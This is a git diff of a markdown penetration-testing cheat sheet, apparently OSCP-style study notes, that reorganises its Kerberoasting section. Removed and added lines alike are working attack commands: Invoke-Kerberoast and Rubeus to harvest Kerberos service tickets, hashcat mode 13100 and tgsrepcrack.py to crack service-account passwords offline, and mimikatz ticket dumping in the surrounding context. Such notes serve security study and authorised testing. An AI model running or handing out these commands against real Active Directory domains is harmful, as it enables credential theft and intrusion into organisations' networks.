@@ -106,21 +106,6 @@ password hash:
 TGT and TGS:
 1. sekurlsa::tickets
 ```
-###### Service Account Attacks
-https://github.com/KiritoLoveAsuna/Penetration-Testing/blob/main/Invoke-Kerberoast.ps1
-```
-Import-module .\Invoke-Kerberoast.ps1
-Get-DomainSearcher -Domain testlab.local
-Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation
-hashcat64.exe -m 13100 hash.txt pass.txt --force
-Get-DomainSearcher -Domain testlab.local -LDAPFilter '(samAccountType=805306368/serviceprincipalname=*http*)' -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation
-```
-
-```
-kerberos::list == klist
-sudo apt update && sudo apt install kerberoast
-python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
-```
 ###### Kerberoasting
 >The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts. Thus, part of these TGS tickets are encrypted with keys derived from user passwords. As a consequence, their credentials could be cracked offline. You can know that a user account is being used as a service because the property "ServicePrincipalName" is not null.
 
@@ -130,6 +115,11 @@ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~
 ```
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
 hashcat -a 0 -m 13100 hashes.kerberoast rockyou.txt
+
+Import-module .\Invoke-Kerberoast.ps1
+Invoke-Kerberoast -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation
+ Invoke-Kerberoast
+Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
 ```
 
 ### Lateral Movement
